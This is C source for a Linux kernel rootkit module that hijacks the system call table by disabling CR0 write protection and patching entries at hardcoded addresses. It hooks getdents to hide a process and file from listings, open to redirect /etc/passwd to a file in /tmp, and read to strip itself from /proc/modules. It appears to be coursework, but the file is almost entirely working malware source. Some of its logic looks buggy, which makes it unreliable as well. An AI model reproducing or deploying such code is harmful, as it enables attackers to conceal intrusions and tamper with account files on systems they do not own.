#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/uaccess.h>

#define BUFFLEN 256
int sneaky_pid = 100;
module_param(sneaky_pid, int, 0);
int procfd;

struct linux_dirent {
  u64            d_ino;
  s64            d_off;
  unsigned short d_reclen;
  char           d_name[BUFFLEN];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
//Change str to an int
/*int myatoi (char* str) {
  int res = 0;
  char* ptr;
  for (ptr = str; ptr < (str + strlen(str)); ptr++) {
    if ((*ptr) < '0' || (*ptr) > '9') {
      return (-1);
    }
    res += res * 10 + ((*ptr) - '0');
  }
  return res;
  } */

//Define my own version of getdents

asmlinkage int (*orig_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent* dirp, unsigned int count) {
  unsigned int size = 0;
  unsigned int bpos = 0;
  struct linux_dirent* dir1 = NULL;
  struct linux_dirent* dir2 = NULL;
  char hide[] = "sneaky_process";
  printk("%d\n", sneaky_pid);
  //call original getdents
  size = (*orig_getdents)(fd, dirp, count);
  for (bpos = 0; bpos < size;) {
    dir1 = (struct linux_dirent*)((char*)dirp + bpos);
    char buf[128];
    sprintf(buf, "%d", sneaky_pid);
    if (strcmp(dir1->d_name, hide) == 0 || strcmp(dir1->d_name, buf) == 0) {
      dir1->d_name[0] = '\0';
      size -= dir1->d_reclen;
      if (dir2) {
	dir2->d_reclen += dir1->d_reclen;
      }
    }
    bpos += dir1->d_reclen;
    dir2 = dir1;
  }
  return size;
}

//Define our new sneaky version of the 'open' syscall
/*asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  return original_call(pathname, flags);
  }*/
//Define the open system call
asmlinkage int (*orig_open) (const char* pathname, int flags);
asmlinkage int hacked_open(const char* pathname, int flags) {
  const char* ppathname = "/proc/modules";
  char* pathname1 = "/etc/passwd";
  const char* filename1 = "/tmp/passwd";
  if (strcmp(pathname, ppathname) == 0) {
    procfd = orig_open(pathname, flags);
    return procfd;
  } else {
    procfd = -1;
  }
  if (strcmp(pathname, pathname1) == 0) {
    //when the pathname is "/etc/passwd" file
    printk(KERN_INFO "pathname is %s\n", pathname);
    if (!copy_to_user(pathname, filename1, strlen(filename1))) {
      printk(KERN_INFO "copy to user space failed\n");
    } else {
      printk(KERN_INFO "copy to user space success");
    }
  }
  return orig_open(pathname, flags);
}

//Define the read system call
asmlinkage ssize_t (*orig_read)(int fd, void* buf, size_t count);
asmlinkage ssize_t hacked_read(int fd, void* buf, size_t count) {
  //call the original read call
  ssize_t size = (*orig_read)(fd, buf, count);
  if (fd == procfd) {
    printk(KERN_INFO "%s", (char*)buf);
    char* p = (char*)buf;
    char* curr = p;
    while (*p != '\0') {
      //find the sneaky process command
      if (*p == '\0' || *(p+5) == '\0') {
	continue;
      }
      if ((*p) == 's' && *(p+1) == 'n' && *(p+2) == 'e' && *(p+3) == 'a' && *(p+4) == 'k' && *(p+5) == 'y') {
	curr = p;
	while (*curr != '\n') {
	  curr++;
	}
	curr++;
	break;
      } else {
	while (*p != '\n') {
	  p++;
	}
	p++;
      }
    }
    if (*curr != '\0') {
      while (*curr != '\0' && *p != '\0') {
	*p = *curr;
	p++;
	curr++;
      }
      *p = '\0';
    } else {
      *p = '\0';
    }
  }
  return size;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  orig_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)hacked_getdents;
  orig_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)hacked_open;
  orig_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)hacked_read;
  //original_call = (void*)*(sys_call_table + __NR_open);
  // *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
  } 
static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  //*(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long) orig_getdents;
  *(sys_call_table + __NR_open) = (unsigned long) orig_open;
  *(sys_call_table + __NR_read) = (unsigned long) orig_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
